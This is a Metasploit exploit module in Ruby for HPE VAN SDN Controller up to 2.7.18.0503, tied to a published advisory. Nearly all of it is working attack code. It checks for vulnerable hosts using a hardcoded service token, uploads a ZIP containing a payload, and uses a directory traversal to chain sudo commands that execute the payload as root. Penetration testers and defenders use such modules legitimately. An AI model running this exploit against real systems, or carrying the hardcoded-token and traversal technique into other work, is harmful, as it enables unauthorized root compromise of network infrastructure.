##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote

  Rank = ExcellentRanking

  # server: grizzly/2.2.16
  HttpFingerprint = {pattern: [/^grizzly/]}

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::EXE
  include Msf::Exploit::FileDropper

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'HP VAN SDN Controller Hardcoded Service Token RCE',
      'Description'    => %q{
        This module exploits a hardcoded service token and weak sudo permissions
        in HPE VAN SDN Controller <= 2.7.18.0503 to execute a payload as root.

        Using the service token, a ZIP file containing the payload is uploaded
        to the server, where it is automatically unzipped by the software.

        A temporary directory is created in the process, thereby leading to a
        directory traversal that is exploited to chain sudo commands.

        The chained sudo commands are then used to execute the payload as root.
      },
      'Author'         => [
        'Matt Bergin', # Vulnerability discovery and Python exploit
        'wvu'          # Metasploit module and additional ~research~
      ],
      'References'     => [
        ['EDB', '44951'],
        ['URL', 'https://korelogic.com/Resources/Advisories/KL-001-2018-008.txt']
      ],
      'DisclosureDate' => 'Jun 25 2018',
      'License'        => MSF_LICENSE,
      'Platform'       => 'linux',
      'Arch'           => [ARCH_X86, ARCH_X64],
      'Privileged'     => true,
      'Targets'        => [['Automatic', {}]],
      'DefaultTarget'  => 0,
      'DefaultOptions' => {'RPORT' => 8081, 'SSL' => true}
    ))
  end

  def check
    checkcode = CheckCode::Safe

    res = send_request_cgi(
      'method'  => 'POST',
      'uri'     => '/',
      'headers' => {'X-Auth-Token' => 'AuroraSdnToken37'},
      'ctype'   => 'application/json',
      'data'    => {'action' => 'exec'}.to_json
    )

    if res.nil?
      checkcode = CheckCode::Unknown
    elsif res && res.code == 400 && res.body.include?('Missing field: name')
      checkcode = CheckCode::Appears
    elsif res && res.code == 401 && res.body.include?('Invalid token')
      checkcode = CheckCode::Safe
    end

    checkcode
  end

  def exploit
    print_status('Uploading payload ZIP')
    payload_path = upload_payload

    # XXX: Let rm(1) and unzip(1) catch up
    print_status('Waiting for payload to be unzipped...')
    sleep(2)

    print_status('Executing payload')
    execute_command("chmod +x #{payload_path}")
    execute_command(payload_path)
  end

  def upload_payload
    payload_name = Rex::Text.rand_text_alphanumeric(8..42)
    payload_path = "/var/lib/sdn/uploads/tmp/#{payload_name}"

    zip_name = "#{Rex::Text.rand_text_alphanumeric(8..42)}.zip"
    zip_path = "/var/lib/sdn/uploads/#{zip_name}"

    zip = Msf::Util::EXE.to_zip([
      fname: payload_name,
      data:  generate_payload_exe
    ])

    res = send_request_cgi(
      'method'         => 'POST',
      'uri'            => '/upload',
      'headers'        => {
        'Filename'     => zip_name,
        'X-Auth-Token' => 'AuroraSdnToken37'
      },
      'ctype'          => 'application/octet-stream',
      'data'           => zip
    )

    unless res && res.code == 200 && res.body.include?('{ }')
      fail_with(Failure::UnexpectedReply, "Failed to upload #{zip_path}")
    end

    register_files_for_cleanup(payload_path, zip_path)

    print_good("Uploaded #{zip_path}")

    payload_path
  end

  def execute_command(cmd)
    # TODO: Make this less obvious
    privesc = "../../../../../usr/bin/sudo -u sdn sudo #{cmd}"

    print_status("Executing #{privesc}")

    send_request_cgi({
      'method'  => 'POST',
      'uri'     => '/',
      'headers' => {'X-Auth-Token' => 'AuroraSdnToken37'},
      'ctype'   => 'application/json',
      'data'    => {'action' => 'exec', 'name' => privesc}.to_json
    }, 1)
  end

end
